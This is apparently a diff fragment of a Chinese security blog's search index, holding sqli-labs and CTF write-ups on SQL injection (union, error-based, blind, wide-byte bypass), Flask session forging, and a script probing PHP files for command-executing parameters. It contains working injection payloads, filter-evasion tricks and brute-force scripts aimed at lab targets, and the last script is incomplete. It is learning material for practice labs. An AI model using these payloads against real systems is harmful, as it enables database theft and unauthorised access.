+<li>若查询语句为<code>where id=(&#39;$id&#39;)</code>，查询时是<code>where id=(&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;)</code>，MySQL 将<code>&#39;2&#39;</code>作为了 Bool 值，结果是<code>where id=(&#39;1&#39;)</code>，回显会是<code>id=1</code>。</li>
+</ul>
+<ol>
+<li><code>1&#39;)||&#39;1&#39;=(&#39;1</code><br> 若查询语句有小括号正确回显，若无小括号错误回显（无回显）</li>
+</ol>
+</blockquote>
+<h3 id="查看被过滤字符的python脚本"><a href="#查看被过滤字符的python脚本" class="headerlink" title="查看被过滤字符的python脚本"></a>查看被过滤字符的python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span><span class="params">(num)</span>:</span></span><br><span class="line">    tmp = hex(i).replace(<span class="string">"0x"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> len(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">'0'</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%"</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    name = urllib.parse.unquote(i)</span><br><span class="line">    </span><br><span class="line">    url = <span class="string">"http://localhost/Sql-labs/Less-26a/?id="</span> + i </span><br><span class="line">    res = req.get(url).text</span><br><span class="line">    start = res.find(<span class="string">'Your Input is Filtered with following result:'</span>)</span><br><span class="line">    value = res[start+<span class="number">46</span>:start+<span class="number">47</span>]</span><br><span class="line">    <span class="keyword">if</span> value!=name:</span><br><span class="line">        print(<span class="string">"you cannot use "</span> + i + <span class="string">":"</span> + name)</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本跑出来是这样：</p>
+<p><img src="/2020/09/26/sql-labs/26_3.png" alt="26_3"></p>
+<h3 id="代替空格的url编码"><a href="#代替空格的url编码" class="headerlink" title="代替空格的url编码"></a>代替空格的url编码</h3><blockquote>
+<ul>
+<li><code>%09</code> TAB 键（水平）</li>
+<li><code>%0a</code> 新建一行</li>
+<li><code>%0b</code> TAB 键（垂直）</li>
+<li><code>%0c</code> 新的一页</li>
+<li><code>%0d</code> return 功能</li>
+<li><code>%a0</code> 空格</li>
+</ul>
+</blockquote>
+<p>可以看出，除了%a0以外全部被过滤，那么我们就可以用%a0来代替空格</p>
+<h3 id="遗留疑惑4"><a href="#遗留疑惑4" class="headerlink" title="遗留疑惑4"></a>遗留疑惑4</h3><p>这里windows对%a0的转义有点问题，所以按照答案做的也不能爆出字段，暂时搁置。</p>
+<h2 id="No-27【过滤select和union】"><a href="#No-27【过滤select和union】" class="headerlink" title="No.27【过滤select和union】"></a>No.27【过滤select和union】</h2><p>首先测试发现是单引号注入点，然后测试发现过滤字符：</p>
+<p><img src="/2020/09/26/sql-labs/27_1.png" alt="27_1"></p>
+<p>测试发现可以用%0a代替空格，and也没有被过滤：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一：</span><br><span class="line">?id&#x3D;0&#39;%0auniOn%0aseLect%0a1,database(),3%0aand &#39;1&#39;&#x3D;&#39;1			&#x2F;&#x2F;大小写绕过select和union</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">直接报错注入：</span><br><span class="line">?id&#x3D;-1&#39;and(updatexml(1,concat(0x7e,(database()),0x7e),1))and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>看一下源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;strip out &#x2F;*</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);		&#x2F;&#x2F;Strip out --.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);			&#x2F;&#x2F;Strip out #.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;m&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;union&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out union</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out select</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;UNION&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out UNION</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;SELECT&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out SELECT</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;Union&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out Union</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;Select&#x2F;s&#39;,&quot;&quot;, $id);	    &#x2F;&#x2F;Strip out select</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="No-27a"><a href="#No-27a" class="headerlink" title="No.27a"></a>No.27a</h2><p>和上一关差不多，就是换成了双引号。</p>
+<blockquote>
+<p>但看大佬们的答案时，这里有个神奇的payload，我好好研究下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot;and(if(ascii(substr((SeLect(table_name)from(SeLect(table_name),(table_rows)from(information_schema.tables)where(table_schema&#x3D;database())and(table_rows&#x3D;14))a),1,1))&gt;137,0,sleep(5)))and&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>
+
+<p>这个payload的核心是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SeLect(table_name)from(SeLect(table_name),(table_rows)from(information_schema.tables)where(table_schema&#x3D;database())and(table_rows&#x3D;8))a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/27_2.png" alt="27_2"></p>
+<p>因为substr只能处理一个字段，所以将需要请求的两个字段放在from里，并起别名a，这个在No.5floor报错注入里提到过。</p>
+<p>但随后发现，不用from也是可以的：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot;and(if(ascii(substr((SeLect(table_name)from(information_schema.tables)where(table_schema&#x3D;database())and(table_rows&#x3D;14)),1,1))&gt;137,0,sleep(5)))and&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>
+
+<p>但可能以后用得到，所以就把过程都记录下来了。</p>
+</blockquote>
+<p>从这个payload里学到了，对于<code>limit 0,1</code>空格不能使用时，我们可以使用<strong>其他字段</strong>来增加限制条件。</p>
+<h2 id="No-28"><a href="#No-28" class="headerlink" title="No.28"></a>No.28</h2><p>先测试注入点，发现是单引号加小括号注入。</p>
+<p><img src="/2020/09/26/sql-labs/28_1.png" alt="28_1"></p>
+<p>发现这里的select和union被过滤，于是想到可不可以双写注入：</p>
+<p><img src="/2020/09/26/sql-labs/28_2.png" alt="28_2"></p>
+<p>这里双写的select和union又出现了，很迷，看一下源码“</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;union\s+select&#x2F;i&#39;,&quot;&quot;, $id);</span><br></pre></td></tr></table></figure>
+
+<p>\s是空格的意思，+是匹配随便多少个空格，意思是去掉<code>union+空格类似符+select</code>。</p>
+<p>于是这样构造：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39;)%0aunion%0aunion%0aselect%0aselect%0a1,2,3%0aand &#39;1&#39;&#x3D;(&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>这关不回显错误，所以不能用布尔注入。</p>
+<h2 id="No-28a"><a href="#No-28a" class="headerlink" title="No.28a"></a>No.28a</h2><p>和上一关一样，也可以用布尔注入和时间注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)and &#39;1&#39;&#x3D;(&#39;2			&#x2F;&#x2F;不返回</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)and &#39;1&#39;&#x3D;(&#39;1			&#x2F;&#x2F;返回</span><br></pre></td></tr></table></figure>
+
+<p>payload类似于</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;) %0a and %0a if((ascii(substring((select %0a table_name %0a from %0a information_schema.tables %0a where %0a table_schema&#x3D;&#39;security&#39; %0a limit %0a 0,1),1,1))&gt;200),1,sleep(2))%0a and &#39;1&#39;&#x3D;(&#39;1</span><br><span class="line"></span><br><span class="line">%00截断似乎也可以：</span><br><span class="line">?id&#x3D;1&#39;) %0a and %0a if((ascii(substring((select %0a table_name %0a from %0a information_schema.tables %0a where %0a table_schema&#x3D;&#39;security&#39; %0a limit %0a 0,1),1,1))&gt;200),1,sleep(2))%0a;%00</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="No-29-No-31"><a href="#No-29-No-31" class="headerlink" title="No.29-No.31"></a>No.29-No.31</h2><p>这三关都讲了一件事：<a href="http://www.mamicode.com/info-detail-2909452.html" target="_blank" rel="noopener">看这</a>和<a href="https://www.cnblogs.com/lcamry/p/5762961.html" target="_blank" rel="noopener">这里</a></p>
+<p>讲的是服务器的两层架构，总的来说可以利用<strong>参数污染</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2			</span><br><span class="line">&#x2F;&#x2F;这样显示的是id&#x3D;2的搜索内容，直接在id&#x3D;2后面进行注入点测试即可</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="No-32【宽字节注入】【绕过引号】"><a href="#No-32【宽字节注入】【绕过引号】" class="headerlink" title="No.32【宽字节注入】【绕过引号】"></a>No.32【宽字节注入】【绕过引号】</h2><p>这一关过滤了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">&#x2F;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string &#x3D; preg_replace(&#39;&#x2F;&#39;. preg_quote(&#39;\\&#39;) .&#39;&#x2F;&#39;, &quot;\\\\\\&quot;, $string);          &#x2F;&#x2F;escape any backslash</span><br><span class="line">    $string &#x3D; preg_replace(&#39;&#x2F;\&#39;&#x2F;i&#39;, &#39;\\\&#39;&#39;, $string);                               &#x2F;&#x2F;escape single quote with a backslash</span><br><span class="line">    $string &#x3D; preg_replace(&#39;&#x2F;\&quot;&#x2F;&#39;, &quot;\\\&quot;&quot;, $string);                                &#x2F;&#x2F;escape double quote with a backslash</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/32_1.png" alt="32_1"></p>
+<p>正常注入’会被转义，这里我没想到可以用宽字节注入，因为汉字是两个字节，我们可以在,即转义符号之前加上另一个十六进制把它构成一个汉字：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1%dd&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这里%dd变成十六进制（0xdd）和后面的\（0x5c）在一起构成了0xdd0x5c是一个汉字，后面的单引号就被释放了。</p>
+<blockquote>
+<p>宽字节注入：本人理解的是，由于英文编码每个字母占一个字节，而汉语编码每个汉字占用两个字节，而注入的时候会自动在单引号和双引号前面加上反斜杠（\’)进行转义造成注入失败，所以前面再加上一个汉语编码，如%df（其他编码也可以，不过要ASCII值大于128服务器才会认为是汉字（GBK）编码），由于服务器认为编码是两个字节所以会将后面的反斜杠编码（\）即%5c也看作是汉语编码，从而造成%df%5c被认为是一个汉字，后面的单引号逃逸了出来构成注入。</p>
+</blockquote>
+<p><img src="/2020/09/26/sql-labs/32_2.png" alt="32_2"></p>
+<p>这样就成功报错，接下来正常注入就行了</p>
+<p>还有一个小问题，就是我们遇到如下语句时也是会接触双引号的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>
+
+<p>这里有两种方法绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一：直接用database()代替&#39;security&#39;</span><br><span class="line">?id&#x3D;-1%dd%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+</span><br><span class="line"></span><br><span class="line">方法二：可以使用十六进制绕过</span><br><span class="line">?id&#x3D;-1%dd%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br><span class="line">&#x2F;&#x2F;首先，这里的十六进制之前要加0x；</span><br><span class="line">&#x2F;&#x2F;其次，这里十六进制encoding的只是security而不是&#39;security&#39;</span><br></pre></td></tr></table></figure>
+
+<p>爆列类似：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1%dd%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)--+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="No-33"><a href="#No-33" class="headerlink" title="No.33"></a>No.33</h2><p>这一关用的addslashes()函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string&#x3D; addslashes($string);    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但总的注入方法还是一样的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1%dd&#39;  union select 1,database(),3--+</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>登录页面</title>
+    <url>/2020/09/16/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/</url>
+    <content><![CDATA[<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="flask-session"><a href="#flask-session" class="headerlink" title="flask session"></a>flask session</h3><p>找到登录的session进行解密</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\sessionEncode.py decode -c &quot;.eJw9kMGKg0AQRH9l6bMHMzGXQA6RcUWhe4i0yMxFdjcmZkazoIZEQ_59hxz2XLxHVT2hPg3N2MJ2Gm5NAPXlCNsnfHzDFjTvQyXjC4n8QvYgUGQPJTFCLiylSWjSZMZl_9BczsSdQ25bwxgZmYWGY0t2vyGpV8Zms7bJgoyzqUxLPc4qzR3xIfSZIOmztOgUZzMtRU_9pzPsIlyOHVodUZU9tD0vZPFuqtwqWXomdyjwTrLtFeMOXgH8jMOpnn5dc_2f4DVrlSZrEplHS-FxpxlDX1kQn32luFWy6LDSG7J6pRe3psPurbt-9Y1XTM04QQC3sRne58AqhNcfXiFkGQ.X2FsNg.eplpTBkI29NWHzaZMftZka03qFY&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#39;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;YTA0ODBiN2JiNjQ2M2IxODM4MTRjNGE0ZGEyMzAxYTUyNTlkMThhZTM4ZDI0ZTBjNjA5NDY1ZjIyYjEzMTMyZWZhNmMyOGJkNTQ0ZjI2NDEzMGRlOTIyNzRmNmFkZTk4MzdlMjY4NWIxYjgzNjMwZWJjODU2NDJkM2MwNDhmOTM&#x3D;&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;ZTk3OGE3N2IwZWU2ZWJkYTM0YTU2NTgzMTBhODRlMWY5NjY1Yzk3NQ&#x3D;&#x3D;&quot;&#125;,&quot;name&quot;:&quot;test&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后把test改成admin再加密成session【有错】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\session.py encode -s &quot;ckj123&quot; -t &#39;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;YTA0ODBiN2JiNjQ2M2IxODM4MTRjNGE0ZGEyMzAxYTUyNTlkMThhZTM4ZDI0ZTBjNjA5NDY1ZjIyYjEzMTMyZWZhNmMyOGJkNTQ0ZjI2NDEzMGRlOTIyNzRmNmFkZTk4MzdlMjY4NWIxYjgzNjMwZWJjODU2NDJkM2MwNDhmOTM&#x3D;&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;ZTk3OGE3N2IwZWU2ZWJkYTM0YTU2NTgzMTBhODRlMWY5NjY1Yzk3NQ&#x3D;&#x3D;&quot;&#125;,&quot;name&quot;:&quot;admin&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h2><p><a href="https://unicode-table.com/en/1D3A/" target="_blank" rel="noopener">这个网站找字符</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>sql注入</title>
+    <url>/2020/09/01/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="ex1"><a href="#ex1" class="headerlink" title="ex1"></a>ex1</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/2020/09/01/sql%E6%B3%A8%E5%85%A5/e1_1.png" alt="e1_1"></p>
+<p>使用UNION时，会出现一行虚拟的数据，这时候我们可以虚拟化一个原来的username【George】并且给他配上一个新的密码，这样操作的同时，我们就可以通过新的密码登录这个用户。</p>
+<h3 id="例题：-GXYCTF2019-BabySQli"><a href="#例题：-GXYCTF2019-BabySQli" class="headerlink" title="例题：[GXYCTF2019]BabySQli"></a>例题：[GXYCTF2019]BabySQli</h3><p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&#39; union select 1,&#39;admin&#39;,&#39;4e42f7dd43ecbfe104de58610557c5ba&#39;#</span><br></pre></td></tr></table></figure>
+
+<p>因为username的输入无效，因此mysql返回的数据也只有我们虚拟化的那一行，即可成功登录。</p>
+<h3 id="题目环境复现"><a href="#题目环境复现" class="headerlink" title="题目环境复现"></a>题目环境复现</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line">$name = $_POST[<span class="string">'name'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'pw'</span>];</span><br><span class="line">$sql = <span class="string">"select * from user where username = '"</span>.$name.<span class="string">"'"</span>;   </span><br><span class="line"><span class="comment">// echo $sql;</span></span><br><span class="line">$result = mysqli_query($con, $sql);      </span><br><span class="line">$arr = mysqli_fetch_row($result);</span><br><span class="line"><span class="comment">// print_r($arr);</span></span><br><span class="line"><span class="keyword">if</span>($arr[<span class="number">1</span>] == <span class="string">"admin"</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(md5($password) == $arr[<span class="number">2</span>])&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"wrong pass!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"wrong user!"</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="ex2"><a href="#ex2" class="headerlink" title="ex2"></a>ex2</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="/2020/09/01/sql%E6%B3%A8%E5%85%A5/e2_1.png" alt="e2_1"></p>
+<p>这个是利用了extractvalue()函数报错【updatexml】</p>
+<h2 id="ex3（异或注入）"><a href="#ex3（异或注入）" class="headerlink" title="ex3（异或注入）"></a>ex3（异或注入）</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>本题过滤了union，按道理说可以使用</p>
+<blockquote>
+<p>利用<code>/*!union*/</code>可以绕过对union的过滤</p>
+</blockquote>
+<p>但是本题又过滤了*，所以可以使用以下异或注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select(column)from(table)			&#x2F;&#x2F;获取flag字段</span><br><span class="line">substr((select(column)from(table)),n,1)			&#x2F;&#x2F;获取flag字段的第n个字符</span><br><span class="line">ascii(substr((select(column)from(table)),n,1))&gt;N			&#x2F;&#x2F;判断其ascii码是否大于N</span><br><span class="line">0^(ascii(substr((select(column)from(table)),n,1))&gt;N)			&#x2F;&#x2F;如果判断式子为真，则相当于输入1，为假则相当于输入0</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="例题-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#例题-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="例题:[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>例题:[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>写出python脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://df9ba400-06d5-4de6-bdd2-ee86a9a7a73e.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">		payload = <span class="string">'0^(ascii(substr((select(flag)from(flag)),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(j) + <span class="string">')'</span></span><br><span class="line">		s = requests.post(url, data = &#123;<span class="string">'id'</span>:payload&#125;)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> s.text.find(<span class="string">'Error'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="ex1-极客大挑战-2019-HardSQL"><a href="#ex1-极客大挑战-2019-HardSQL" class="headerlink" title="ex1:[极客大挑战 2019]HardSQL"></a>ex1:[极客大挑战 2019]HardSQL</h3><p>过滤了空格，=，and，or</p>
+<p>于是有以下注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(database())),0x7e),1)%23&amp;password&#x3D;admin   &#x2F;&#x2F;爆库名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1)%23&amp;password&#x3D;admin        &#x2F;&#x2F;爆表名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columnss)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1)%23&amp;password&#x3D;admin        &#x2F;&#x2F;爆列名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>
+
+<p>接着发现只出现了左半部分的长度，于是想到用right()函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin%27^updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e),1)%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>extractvalue()</strong>原理一样，就是比updatexml()少一个参数，即两个没用的参数1去掉后面的那个。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>md5有关漏洞</title>
     <url>/2020/08/10/md5%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h2 id="有关md5的sql漏洞"><a href="#有关md5的sql漏洞" class="headerlink" title="有关md5的sql漏洞"></a>有关md5的sql漏洞</h2><blockquote>
@@ -64,6 +861,13 @@
 
 
 <h1 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h1><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/src/"</span></span><br><span class="line">files = os.listdir(<span class="string">"D:/phpstudy_pro/WWW/src"</span>)  <span class="comment">#列出所有文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getGetind</span><span class="params">(fileind)</span>:</span></span><br><span class="line">	a = [];</span><br><span class="line">	fp = open(<span class="string">"D:/phpstudy_pro/WWW/src/"</span> + fileind,<span class="string">'r'</span>)</span><br><span class="line">	lines = fp.readlines()   <span class="comment">#读取文件的每一行</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">		<span class="keyword">if</span> i.find(<span class="string">"$_GET['"</span>) &gt; <span class="number">0</span>:</span><br><span class="line">			start = i.find(<span class="string">"$_GET['"</span>) + <span class="number">7</span></span><br><span class="line">			end = i.find(<span class="string">"'"</span>,start)</span><br><span class="line">			a.append(i[start:end])   <span class="comment">#找到需要的字段</span></span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> files:</span><br><span class="line">	getContent = getGetind(j)</span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> getContent:</span><br><span class="line">		payload = url + j + <span class="string">"?"</span> + k + <span class="string">"=echo AlbatrossG"</span>   <span class="comment">#构造payload</span></span><br><span class="line">		print(payload)</span><br><span class="line">		html = requests.get(payload)    <span class="comment">#向网页发送请求</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"AlbatrossG"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">			print(<span class="string">"Success!"</span>)</span><br><span class="line">			exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="params">(threading.Thread)</span>:</span>   <span class="comment">#增加线程</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, threadID, name, counter)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.counter = counter</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>               </span><br><span class="line">        Send(self.name, self.counter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">	thread = myThread(i,i*<span class="number">20</span>,(i+<span class="number">1</span>)*<span class="number">20</span>)</span><br><span class="line">	thread.start()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
